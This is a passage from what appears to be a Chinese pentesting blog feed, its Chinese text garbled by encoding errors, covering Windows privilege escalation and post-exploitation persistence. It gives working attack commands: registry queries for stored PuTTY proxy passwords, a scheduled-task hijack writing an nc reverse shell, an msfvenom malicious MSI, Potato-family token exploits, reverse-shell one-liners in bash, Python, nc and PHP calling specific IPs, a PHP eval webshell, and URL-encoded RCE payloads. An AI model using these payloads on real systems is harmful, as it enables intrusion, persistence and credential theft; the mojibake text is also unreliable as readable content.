C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PuTTYæ˜¯Windowsç³»ç»Ÿä¸Šå¸¸è§çš„SSHå®¢æˆ·ç«¯ã€‚ç”¨æˆ·ä¸å¿…æ¯æ¬¡éƒ½æŒ‡å®šè¿æ¥çš„å‚æ•°ï¼Œè€Œæ˜¯å¯ä»¥å°†ä¼šè¯å­˜å‚¨åœ¨IPã€ç”¨æˆ·å’Œå…¶ä»–é…ç½®å¯ä»¥å­˜å‚¨çš„åœ°æ–¹ï¼Œä»¥ä¾›ä»¥åä½¿ç”¨ã€‚è™½ç„¶PuTTYä¸å…è®¸ç”¨æˆ·å­˜å‚¨ä»–ä»¬çš„SSHå¯†ç ï¼Œä½†å®ƒä¼šå­˜å‚¨åŒ…æ‹¬æ˜æ–‡èº«ä»½éªŒè¯å‡­æ®çš„ä»£ç†é…ç½®ã€‚</span><br><span class="line"></span><br><span class="line">è¦æ£€ç´¢å­˜å‚¨çš„ä»£ç†å‡­è¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹ä¸‹æœç´¢ProxyPassword:</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br><span class="line"></span><br><span class="line">æ³¨æ„:Simon Tathamæ˜¯PuTTYçš„åˆ›å»ºè€…(ä»–çš„åå­—æ˜¯è·¯å¾„çš„ä¸€éƒ¨åˆ†)ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬æ­£åœ¨æ£€ç´¢å¯†ç çš„ç”¨æˆ·åã€‚è¿è¡Œä¸Šè¿°å‘½ä»¤åï¼Œå­˜å‚¨çš„ä»£ç†ç”¨æˆ·åä¹Ÿåº”è¯¥æ˜¯å¯è§çš„ã€‚</span><br><span class="line"></span><br><span class="line">å°±åƒputtyå­˜å‚¨å‡­æ®ä¸€æ ·ï¼Œä»»ä½•å­˜å‚¨å¯†ç çš„è½¯ä»¶ï¼ŒåŒ…æ‹¬æµè§ˆå™¨ã€ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ã€FTPå®¢æˆ·ç«¯ã€SSHå®¢æˆ·ç«¯ã€VNCè½¯ä»¶ç­‰ï¼Œéƒ½æœ‰æ¢å¤ç”¨æˆ·ä¿å­˜çš„ä»»ä½•å¯†ç çš„æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure><h5 id="å®šæ—¶ä»»åŠ¡"><a href="#å®šæ—¶ä»»åŠ¡" class="headerlink" title="å®šæ—¶ä»»åŠ¡"></a>å®šæ—¶ä»»åŠ¡</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢å®šæ—¶ä»»åŠ¡</span></span><br><span class="line">schtasks /query</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æƒé™</span></span><br><span class="line">icacls</span><br><span class="line"><span class="comment"># å†™å…¥</span></span><br><span class="line"><span class="built_in">echo</span> c:\tools\nc64.exe <span class="literal">-e</span> cmd.exe  <span class="number">10.17</span>.<span class="number">16.148</span>  <span class="number">1234</span> &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure><h5 id="æ¶æ„msiå®‰è£…ç¨‹åº"><a href="#æ¶æ„msiå®‰è£…ç¨‹åº" class="headerlink" title="æ¶æ„msiå®‰è£…ç¨‹åº"></a>æ¶æ„msiå®‰è£…ç¨‹åº</h5><p>å‰ç½®æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><p>msfç”Ÿæˆæ¶æ„msi</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.63.3 LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure><p>å—å®³æœºæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevatedæ¨¡å—</p><h4 id="å†å²å‘½ä»¤"><a href="#å†å²å‘½ä»¤" class="headerlink" title="å†å²å‘½ä»¤"></a>å†å²å‘½ä»¤</h4><ul><li><p>cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230419221533716-1693976683312.png" alt="image-20230419221533716"></p><p>ä»¥è¿™ä¸ªç”¨æˆ·æƒé™å¼€å¯ä¸€ä¸ªæ–°çš„cmd</p><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>å·¥å…·<a href="https://github.com/hfiref0x/UACME">hfiref0x&#x2F;UACME: Defeating Windows User Account Control (github.com)</a></p><h4 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h4><p>å·¥å…·<a href="https://github.com/BeichenDream/SharpToken">BeichenDream&#x2F;SharpToken: Windows Token Stealing Expert (github.com)</a></p><blockquote><p>åœ¨çº¢é˜Ÿæ¨ªå‘ç§»åŠ¨æœŸé—´ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦çªƒå–å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚åœ¨ç°ä»£EDRçš„é˜²å¾¡ä¸‹ï¼Œæˆ‘ä»¬å¾ˆéš¾ä½¿ç”¨Mimikatzæ¥è·å–å…¶ä»–ç”¨æˆ·æƒé™ï¼Œå¦‚æœç›®æ ‡ç”¨æˆ·æ²¡æœ‰è¿›ç¨‹å­˜æ´»ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠæ³•ä½¿ç”¨â€œOpenProcessTokenâ€æ¥çªƒå–Tokenã€‚</p><p>SharpTokenæ˜¯ä¸€ä¸ªåˆ©ç”¨Tokenæ³„æ¼çš„å·¥å…·ã€‚å®ƒå¯ä»¥ä»ç³»ç»Ÿä¸­çš„æ‰€æœ‰è¿›ç¨‹ä¸­æ‰¾åˆ°æ³„æ¼çš„ä»¤ç‰Œå¹¶ä½¿ç”¨å®ƒä»¬ã€‚å¦‚æœæ‚¨æ˜¯ä½æƒé™çš„æœåŠ¡ç”¨æˆ·ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨å®ƒæ¥å‡çº§åˆ°â€œNT AUTHORITY\SYSTEMâ€æƒé™ï¼Œå¹¶ä¸”å¯ä»¥åˆ‡æ¢åˆ°ç›®æ ‡ç”¨æˆ·çš„æ¡Œé¢â€¦</p></blockquote><h4 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h4><p>æŸ¥æ‰¾è¡¥ä¸æƒ…å†µæ¥é€‰æ‹©CVEæ‰“</p><h3 id="åœŸè±†ç³»åˆ—"><a href="#åœŸè±†ç³»åˆ—" class="headerlink" title="åœŸè±†ç³»åˆ—"></a>åœŸè±†ç³»åˆ—</h3><h4 id="çƒ‚åœŸè±†ï¼ˆRotten-Potatoï¼‰"><a href="#çƒ‚åœŸè±†ï¼ˆRotten-Potatoï¼‰" class="headerlink" title="çƒ‚åœŸè±†ï¼ˆRotten Potatoï¼‰"></a>çƒ‚åœŸè±†ï¼ˆRotten Potatoï¼‰</h4><p>çƒ‚åœŸè±†ä¸é€‚ç”¨äº &gt;&#x3D; Windows 10 1809 å’Œ Windows Server 2019 çš„ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/foxglovesec/RottenPotato</span><br><span class="line"></span><br><span class="line">çƒ‚åœŸè±†é…åˆMSFææƒ</span><br><span class="line">    ä½¿ç”¨ä»¤ç‰Œçªƒå–è¿›è¡Œææƒ</span><br><span class="line">    use incognito  ï¼ˆè¿›å…¥incognitoæ¨¡å—ï¼‰</span><br><span class="line">    é€šè¿‡MSFæ‰§è¡Œçƒ‚åœŸè±†</span><br><span class="line">    execute -cH -f RottenPotato.exe</span><br><span class="line">    list_tokens -u  ï¼ˆåˆ—å‡ºä»¤ç‰Œï¼‰</span><br><span class="line">    impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure><h4 id="çƒ‚åœŸè±†NGï¼ˆRotten-PotatoNGï¼‰"><a href="#çƒ‚åœŸè±†NGï¼ˆRotten-PotatoNGï¼‰" class="headerlink" title="çƒ‚åœŸè±†NGï¼ˆRotten PotatoNGï¼‰"></a>çƒ‚åœŸè±†NGï¼ˆRotten PotatoNGï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/antonioCoco/JuicyPotatoNG</span><br><span class="line"></span><br><span class="line">JuicyPotatoNG.exe -t * -p &quot;c:\Windows\System32\cmd.exe&quot; -a &quot;/c whaomi &gt; .\1.txt&quot;</span><br><span class="line"></span><br><span class="line">å¼ºåˆ¶å‚æ•°:-t createprocess call: &lt;t&gt; CreateProcessWithTokenWï¼Œ &lt;u&gt; CreateProcessAsUserï¼Œ &lt;*&gt;åŒæ—¶å°è¯•</span><br><span class="line">-p &lt;program&gt;:è¦å¯åŠ¨çš„ç¨‹åºå¯é€‰å‚æ•°</span><br><span class="line">-1 &lt;port&gt;: COMæœåŠ¡å™¨ç›‘å¬ç«¯å£(é»˜è®¤ä¸º10247)</span><br><span class="line">-a &lt;argument&gt;:ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°(é»˜è®¤ä¸ºNULL)</span><br><span class="line">-c &lt;CLSID&gt;:(é»˜è®¤å€¼&#123;854A20FB-2D44-457D-992F-EF13785D2B51&#125;)</span><br><span class="line">-i:äº¤äº’å¼æ§åˆ¶å°(ä»…å¯¹CreateProcessAsUseræœ‰æ•ˆ)é¢å¤–çš„æ¨¡å¼</span><br><span class="line">-b:æš´åŠ›ç ´è§£æ‰€æœ‰clsidã€‚alert:ä»…ç”¨äºæµ‹è¯•ã€‚å¤§çº¦ä¼šäº§ç”Ÿ1000ä¸ªè¿›ç¨‹!</span><br><span class="line">-s:å¯»æ‰¾æ²¡æœ‰è¢«Windows Defenderé˜²ç«å¢™è¿‡æ»¤çš„åˆé€‚COMç«¯å£</span><br></pre></td></tr></table></figure><h4 id="å¤šæ±åœŸè±†ï¼ˆJuicy-Potatoï¼‰"><a href="#å¤šæ±åœŸè±†ï¼ˆJuicy-Potatoï¼‰" class="headerlink" title="å¤šæ±åœŸè±†ï¼ˆJuicy Potatoï¼‰"></a>å¤šæ±åœŸè±†ï¼ˆJuicy Potatoï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ohpe/juicy-potato</span><br><span class="line">http://ohpe.it/juicy-potato/CLSID/</span><br><span class="line">å¤šæ±åœŸè±†é€‚ç”¨äº&lt; Windows 10 1809 &lt; Windows Server 2019</span><br><span class="line">ä¸éœ€è¦ meterpreter shellï¼Œå¯ä»¥æŒ‡å®šCOMæœåŠ¡å™¨ä¾¦å¬ç«¯å£ï¼Œå¯ä»¥é€‰æ‹©CLSID</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ï¼Œæ˜¯å¦ç¬¦åˆè¦æ±‚</span><br><span class="line">whoami /priv</span><br><span class="line">é™åˆ¶æ¡ä»¶ï¼šéœ€è¦æ”¯æŒSeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™ï¼Œå¼€å¯DCOMï¼Œæœ¬åœ°æ”¯æŒRPCæˆ–è€…è¿œç¨‹æœåŠ¡å™¨æ”¯æŒPRCå¹¶èƒ½æˆåŠŸç™»å½•ï¼Œèƒ½å¤Ÿæ‰¾åˆ°å¯ç”¨çš„COMå¯¹è±¡</span><br><span class="line">    å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t t</span><br><span class="line">    å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t u</span><br><span class="line">ä½¿ç”¨è¯¦æƒ…è§https://github.com/ohpe/juicy-potato</span><br></pre></td></tr></table></figure><h4 id="å¤šæ±åœŸè±†NGï¼ˆJuicy-PotatoNGï¼‰"><a href="#å¤šæ±åœŸè±†NGï¼ˆJuicy-PotatoNGï¼‰" class="headerlink" title="å¤šæ±åœŸè±†NGï¼ˆJuicy PotatoNGï¼‰"></a>å¤šæ±åœŸè±†NGï¼ˆJuicy PotatoNGï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/antonioCoco/JuicyPotatoNG</span><br><span class="line">JuicyPotatoNG.exe -t * -p &quot;C:\windows\system32\cmd.exe&quot; -a &quot;/c whoami &gt; C:\JuicyPotatoNG.txt&quot;</span><br></pre></td></tr></table></figure><h4 id="RasmanPotato"><a href="#RasmanPotato" class="headerlink" title="RasmanPotato"></a>RasmanPotato</h4><p>Windows 10(11æœªæµ‹è¯•)ï¼ŒWindows Server 2012 - 2019(2022æœªæµ‹è¯•)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magicRasMan v0.1</span><br><span class="line">Provided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM</span><br><span class="line">Arguments:</span><br><span class="line"> -c &lt;CMD&gt;       Execute the command *CMD*</span><br><span class="line"> -m &lt;METHOD&gt;            Choose The RPC Function [1]VpnProtEngWinRtConnect [2]VpnProtEngGetInterface</span><br><span class="line"> -i             Interact with the new process in the current command prompt (default is non-interactive)</span><br></pre></td></tr></table></figure><h4 id="DCOMPotato"><a href="#DCOMPotato" class="headerlink" title="DCOMPotato"></a>DCOMPotato</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zcgonvh/DCOMPotato</span><br></pre></td></tr></table></figure><h4 id="LocalPotatoï¼ˆCVE-2023-21746ï¼‰"><a href="#LocalPotatoï¼ˆCVE-2023-21746ï¼‰" class="headerlink" title="LocalPotatoï¼ˆCVE-2023-21746ï¼‰"></a>LocalPotatoï¼ˆCVE-2023-21746ï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/decoder-it/LocalPotato</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åæ¸—é€ä¹‹æƒé™ç»´æŒ</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="æƒé™ç»´æŒçš„ç›®çš„"><a href="#æƒé™ç»´æŒçš„ç›®çš„" class="headerlink" title="æƒé™ç»´æŒçš„ç›®çš„"></a>æƒé™ç»´æŒçš„ç›®çš„</h1><blockquote><p>å½“è·å–åˆ°æœåŠ¡å™¨çš„æ§åˆ¶æƒåï¼Œä¸ºäº†é˜²æ­¢æœåŠ¡å™¨ç®¡ç†å‘˜å‘ç°å’Œä¿®è¡¥æ¼æ´å¯¼è‡´å¯¹æœåŠ¡å™¨æƒé™çš„ä¸¢å¤±ï¼Œæµ‹è¯•äººå‘˜å¾€å¾€éœ€è¦ä¸€äº›æ‰‹æ®µï¼ˆåé—¨ï¼‰æ¥å®ç°å¯¹ç›®æ ‡æœåŠ¡å™¨çš„æŒä¹…åŒ–è®¿é—®ã€‚</p><p>æŒä¹…åŒ–è®¿é—®ï¼ˆPersistenceï¼Œæƒé™ç»´æŒï¼‰æŠ€æœ¯å°±æ˜¯åŒ…æ‹¬ä»»ä½•å¯ä»¥è¢«æµ‹è¯•äººå‘˜ç”¨æ¥åœ¨ç³»ç»Ÿé‡å¯ã€æ›´æ”¹ç”¨æˆ·å‡­æ®æˆ–å…¶ä»–å¯èƒ½é€ æˆè®¿é—®ä¸­æ–­çš„æƒ…å†µå‘ç”Ÿæ—¶ä¿æŒå¯¹ç³»ç»Ÿçš„è®¿é—®æŠ€æœ¯ã€‚</p></blockquote><h1 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h1><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><ul><li><p>æ”»å‡»æœºç›‘å¬ç«¯å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lnvp port</span><br></pre></td></tr></table></figure></li><li><p>è¢«æ”»å‡»æœº</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span><br><span class="line">bash -c <span class="string">&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.174.129&#x27;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 124.220.192.120 1234 -e /bin/bash</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ç‚¹</strong>ï¼šç”¨ncè¿›è¡Œåå¼¹shellï¼Œéœ€è¦ncæ˜¯æä¾›-eå‚æ•°çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯ç³»ç»Ÿapté»˜è®¤å®‰è£…çš„éƒ½æ˜¯ä¸æä¾›åå‘é“¾æ¥çš„ç‰ˆæœ¬ã€‚</p><p><img src="/../../../blog/source/images/image-20230830215804216.png" alt="image-20230830215804216"></p><p>è§£å†³æ–¹æ³•ï¼š</p><ul><li><p>ä¸Šä¼ ç¼–è¯‘å¥½çš„nc</p></li><li><p>åˆ©ç”¨ç®¡é“ç¬¦</p><p>è¢«æ”»å‡»æœº</p><p><img src="/../../../blog/source/images/image-20230823145240080.png" alt="image-20230823145240080"></p><p>æ”»å‡»æœº</p><p><img src="/../../../blog/source/images/image-20230823145311118.png" alt="image-20230823145311118"></p><p><img src="/../../../blog/source/images/image-20230823145323881.png" alt="image-20230823145323881"></p><p>åˆ©ç”¨1234ç«¯å£å°†ä¼ å…¥å†…å®¹äº¤ç»™bashæ‰§è¡Œï¼Œå†å°†å†…å®¹ä»ç«¯å£8888é€å‡ºå»</p></li></ul></li></ul><h2 id="è·å¾—äº¤äº’å¼shell"><a href="#è·å¾—äº¤äº’å¼shell" class="headerlink" title="è·å¾—äº¤äº’å¼shell"></a>è·å¾—äº¤äº’å¼shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c  &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>é”®å…¥ Ctrl-Zï¼Œå›åˆ° VPS çš„å‘½ä»¤è¡Œä¸­ï¼›ç¬¬äºŒæ­¥ï¼Œåœ¨ VPS ä¸­æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br><span class="line">fg</span><br></pre></td></tr></table></figure><p>å›åˆ°å“‘ shell ä¸­ï¼›ç¬¬ä¸‰æ­¥ï¼Œåœ¨å“‘ shell ä¸­é”®å…¥ Ctrl-lï¼Œæ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reset</span><br><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm-256color</span><br><span class="line">stty rows 54 columns 104</span><br></pre></td></tr></table></figure><h1 id="å…æ€"><a href="#å…æ€" class="headerlink" title="å…æ€"></a>å…æ€</h1><p>Webshell</p><p><a href="https://tttang.com/archive/1739/">javaå…æ€åˆé›† - è·³è·³ç³– (tttang.com)</a></p><p><a href="https://mp.weixin.qq.com/s/ZvQOJvJYAUMPWbLtLc5DZw">ä»€ä¹ˆï¼Ÿä½ è¿˜ä¸ä¼šwebshellå…æ€ï¼Ÿï¼ˆä¸€ï¼‰ (qq.com)</a></p><p><a href="https://tttang.com/archive/1840/">æµ…è°ˆJspWebshellä¹‹ç¼–ç  - è·³è·³ç³– (tttang.com)</a></p><p>æœ¨é©¬</p><h1 id="Linuxæƒé™ç»´æŒ"><a href="#Linuxæƒé™ç»´æŒ" class="headerlink" title="Linuxæƒé™ç»´æŒ"></a>Linuxæƒé™ç»´æŒ</h1><p><a href="https://github.com/RuoJi6/HackerPermKeeper">https://github.com/RuoJi6/HackerPermKeeper</a>)</p><h1 id="Windowsæƒé™ç»´æŒ"><a href="#Windowsæƒé™ç»´æŒ" class="headerlink" title="Windowsæƒé™ç»´æŒ"></a>Windowsæƒé™ç»´æŒ</h1><p><a href="https://xz.aliyun.com/t/9718#toc-13">Windowsæƒé™ç»´æŒæ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>æ‹“å±•ï¼š<a href="https://github.com/aplyc1a/blogs/tree/master/%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6/Linux">blogs&#x2F;æŒä¹…æ§åˆ¶&#x2F;Linux at master Â· aplyc1a&#x2F;blogs (github.com)</a></p><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/02.Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html#%E6%B7%BB%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7">02.Linuxæƒé™ç»´æŒ Â· d4m1ts çŸ¥è¯†åº“ (gm7.org)</a></p><h1 id="ä¼ å‚æ‰§è¡Œ"><a href="#ä¼ å‚æ‰§è¡Œ" class="headerlink" title="ä¼ å‚æ‰§è¡Œ"></a>ä¼ å‚æ‰§è¡Œ</h1><h2 id="é‡å®šå‘å†™å…¥"><a href="#é‡å®šå‘å†™å…¥" class="headerlink" title="é‡å®šå‘å†™å…¥"></a>é‡å®šå‘å†™å…¥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;&gt;b.php</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„å¦‚æœä½¿ç”¨åŒå¼•å·$éœ€è¦è½¬ä¹‰</p><p>ç„¶ååœ¨æµ‹è¯•thinkphp rceçš„æ—¶å€™å‘ç°æœ€åè¦åŠ ä¸€ä¸ªç©ºæ ¼</p></blockquote><p>![image-20230403151335228](E:\typora img\image-20230403151335228.png)</p><p>ä¸Šé¢çš„æ˜¯åŠ äº†ç©ºæ ¼çš„</p><p>ä¸‹é¢çš„æ˜¯æ²¡åŠ ç©ºæ ¼çš„</p><h2 id="åå¼¹shell-1"><a href="#åå¼¹shell-1" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;rce.php&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;eval&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sysytem&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.220.192.120%2F1234%20%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B  æˆåŠŸ</span><br><span class="line"></span><br><span class="line">sysytem=python3%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;import socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.41.134%22%2C8888))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D)%3B&#x27;</span> æˆåŠŸ</span><br><span class="line">    </span><br><span class="line">system=bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.220.192.120%2F1234%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;\$sock=fsockopen(\&quot;192.168.41.134\&quot;,8888);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åæ¸—é€ä¹‹äº†è§£</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BA%86%E8%A7%A3/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h1><p>å†…ç½‘æ¸—é€æµ‹è¯•çš„ç›®æ ‡ä¸€èˆ¬æ˜¯è·å–ç‰¹å®šæœºå™¨çš„æƒé™æˆ–è€…ç‰¹å®šç”¨æˆ·ï¼Œè¿›è€Œè·å¾—ç‰¹å®šçš„èµ„æºï¼Œå¯¹å†…ç½‘çš„å®‰å…¨æ€§è¿›è¡Œè¯„ä¼°ã€‚</p><h1 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h1><p>æœ¬æœºä¿¡æ¯åŒ…æ‹¬OSã€æƒé™ã€å†…ç½‘IPæ®µã€æ€è½¯ã€ç«¯å£ã€æœåŠ¡ã€è¡¥ä¸æ›´æ–°é¢‘ç‡ã€ç½‘ç»œè¿æ¥ã€å…±äº«ã€ä¼šè¯ç­‰ã€‚å¦‚æœæ˜¯åŸŸå†…ä¸»æœºï¼ŒOSã€åº”ç”¨è½¯ä»¶ã€è¡¥ä¸ã€æœåŠ¡ã€æ€è½¯è¿™äº›ä¸€èˆ¬éƒ½æ˜¯æ‰¹é‡å®‰è£…çš„ã€‚</p><h1 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" 